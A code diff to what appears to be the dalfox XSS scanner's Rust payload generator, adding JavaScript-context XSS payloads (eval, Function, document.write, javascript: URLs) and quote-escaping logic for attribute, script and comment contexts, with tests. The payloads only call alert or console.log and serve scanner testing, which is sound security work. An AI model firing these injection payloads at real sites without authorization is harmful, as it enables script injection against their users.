@@ -1,6 +1,6 @@
 use crate::cmd::scan::ScanArgs;
 use crate::encoding::{base64_encode, double_url_encode, html_entity_encode, url_encode};
-use crate::parameter_analysis::InjectionContext;
+use crate::parameter_analysis::{DelimiterType, InjectionContext};
 use crate::payload::XSS_PAYLOADS;
 
 // Context-specific payload lists
@@ -11,6 +11,20 @@ const JAVASCRIPT_PAYLOADS: &[&str] = &[
     "prompt(1)",
     "console.log('dalfox')",
     "throw 'dalfox'",
+    "window.location='javascript:alert(1)'",
+    "eval('alert(1)')",
+    "setTimeout('alert(1)', 0)",
+    "setInterval('alert(1)', 0)",
+    "Function('alert(1)')()",
+    "new Function('alert(1)')()",
+    "document.write('<script>alert(1)</script>')",
+    "document.body.innerHTML='<script>alert(1)</script>'",
+    "location.href='javascript:alert(1)'",
+    "window['alert'](1)",
+    "this['alert'](1)",
+    "top['alert'](1)",
+    "parent['alert'](1)",
+    "frames[0]['alert'](1)",
 ];
 
 const ATTRIBUTE_PAYLOADS: &[&str] = &[
@@ -61,21 +75,63 @@ pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
                 payloads.push(payload.to_string());
             }
         }
-        InjectionContext::Attribute => {
-            for &payload in ATTRIBUTE_PAYLOADS.iter() {
-                payloads.push(payload.to_string());
+        InjectionContext::Attribute(delimiter_type) => match delimiter_type {
+            Some(DelimiterType::SingleQuote) => {
+                for &payload in STRING_SINGLE_PAYLOADS.iter() {
+                    payloads.push(payload.to_string());
+                }
+            }
+            Some(DelimiterType::DoubleQuote) => {
+                for &payload in STRING_DOUBLE_PAYLOADS.iter() {
+                    payloads.push(payload.to_string());
+                }
+            }
+            _ => {
+                for &payload in ATTRIBUTE_PAYLOADS.iter() {
+                    payloads.push(payload.to_string());
+                }
+            }
+        },
+        InjectionContext::Javascript(delimiter_type) => {
+            match delimiter_type {
+                Some(DelimiterType::SingleQuote) => {
+                    // For JavaScript in single quotes, use payloads that escape single quotes
+                    for &payload in JAVASCRIPT_PAYLOADS.iter() {
+                        payloads.push(format!("'{};'", payload));
+                    }
+                }
+                Some(DelimiterType::DoubleQuote) => {
+                    // For JavaScript in double quotes, use payloads that escape double quotes
+                    for &payload in JAVASCRIPT_PAYLOADS.iter() {
+                        payloads.push(format!("\"{};", payload));
+                    }
+                }
+                _ => {
+                    for &payload in JAVASCRIPT_PAYLOADS.iter() {
+                        payloads.push(payload.to_string());
+                    }
+                }
             }
         }
-        InjectionContext::Javascript => {
-            for &payload in JAVASCRIPT_PAYLOADS.iter() {
-                payloads.push(payload.to_string());
+        InjectionContext::Comment(delimiter_type) => match delimiter_type {
+            Some(DelimiterType::SingleQuote) => {
+                // Comment with single quote, escape quote and comment
+                for &payload in COMMENT_PAYLOADS.iter() {
+                    payloads.push(format!("'{}", payload));
+                }
             }
-        }
-        InjectionContext::Comment => {
-            for &payload in COMMENT_PAYLOADS.iter() {
-                payloads.push(payload.to_string());
+            Some(DelimiterType::DoubleQuote) => {
+                // Comment with double quote, escape quote and comment
+                for &payload in COMMENT_PAYLOADS.iter() {
+                    payloads.push(format!("\"{}", payload));
+                }
             }
-        }
+            _ => {
+                for &payload in COMMENT_PAYLOADS.iter() {
+                    payloads.push(payload.to_string());
+                }
+            }
+        },
         InjectionContext::Html => {
             // For general HTML, use original payloads
             for &payload in XSS_PAYLOADS.iter() {
@@ -92,15 +148,11 @@ mod tests {
     use super::*;
 
     #[test]
-    fn test_generate_dynamic_payloads_string_single() {
-        let payloads = generate_dynamic_payloads(&InjectionContext::StringSingle);
+    fn test_generate_dynamic_payloads_comment() {
+        let payloads = generate_dynamic_payloads(&InjectionContext::Comment(None));
         assert!(!payloads.is_empty());
-        assert!(payloads.iter().any(|p| p.starts_with("'")));
-        assert!(
-            payloads
-                .iter()
-                .any(|p| p.contains("'><svg/onload=alert(1)>"))
-        );
+        assert!(payloads.iter().any(|p| p.starts_with("-->")));
+        assert!(payloads.iter().any(|p| p.contains("<svg/onload=alert(1)>")));
     }
 
     #[test]
@@ -117,7 +169,7 @@ mod tests {
 
     #[test]
     fn test_generate_dynamic_payloads_attribute() {
-        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute);
+        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute(None));
         assert!(!payloads.is_empty());
         assert!(payloads.iter().any(|p| p.contains("onerror=alert(1)")));
         assert!(
@@ -128,19 +180,63 @@ mod tests {
     }
 
     #[test]
+    fn test_generate_dynamic_payloads_attribute_single_quote() {
+        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute(Some(
+            DelimiterType::SingleQuote,
+        )));
+        assert!(!payloads.is_empty());
+        assert!(payloads.iter().any(|p| p.starts_with("'")));
+    }
+
+    #[test]
+    fn test_generate_dynamic_payloads_attribute_double_quote() {
+        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute(Some(
+            DelimiterType::DoubleQuote,
+        )));
+        assert!(!payloads.is_empty());
+        assert!(payloads.iter().any(|p| p.starts_with("\"")));
+    }
+
+    #[test]
     fn test_generate_dynamic_payloads_javascript() {
-        let payloads = generate_dynamic_payloads(&InjectionContext::Javascript);
+        let payloads = generate_dynamic_payloads(&InjectionContext::Javascript(None));
         assert!(!payloads.is_empty());
         assert!(payloads.iter().any(|p| p == "alert(1)"));
         assert!(payloads.iter().any(|p| p == "console.log('dalfox')"));
     }
 
     #[test]
-    fn test_generate_dynamic_payloads_comment() {
-        let payloads = generate_dynamic_payloads(&InjectionContext::Comment);
+    fn test_generate_dynamic_payloads_javascript_single_quote() {
+        let payloads = generate_dynamic_payloads(&InjectionContext::Javascript(Some(
+            DelimiterType::SingleQuote,
+        )));
         assert!(!payloads.is_empty());
-        assert!(payloads.iter().any(|p| p.starts_with("-->")));
-        assert!(payloads.iter().any(|p| p.contains("<svg/onload=alert(1)>")));
+        assert!(payloads.iter().any(|p| p.contains("alert(1)")));
+    }
+
+    #[test]
+    fn test_generate_dynamic_payloads_javascript_double_quote() {
+        let payloads = generate_dynamic_payloads(&InjectionContext::Javascript(Some(
+            DelimiterType::DoubleQuote,
+        )));
+        assert!(!payloads.is_empty());
+        assert!(payloads.iter().any(|p| p.contains("alert(1)")));
+    }
+
+    #[test]
+    fn test_generate_dynamic_payloads_comment_single_quote() {
+        let payloads =
+            generate_dynamic_payloads(&InjectionContext::Comment(Some(DelimiterType::SingleQuote)));
+        assert!(!payloads.is_empty());
+        assert!(payloads.iter().any(|p| p.starts_with("'-->")));
+    }
+
+    #[test]
+    fn test_generate_dynamic_payloads_comment_double_quote() {
+        let payloads =
+            generate_dynamic_payloads(&InjectionContext::Comment(Some(DelimiterType::DoubleQuote)));
+        assert!(!payloads.is_empty());
+        assert!(payloads.iter().any(|p| p.starts_with("\"-->")));
     }
 
     #[test]
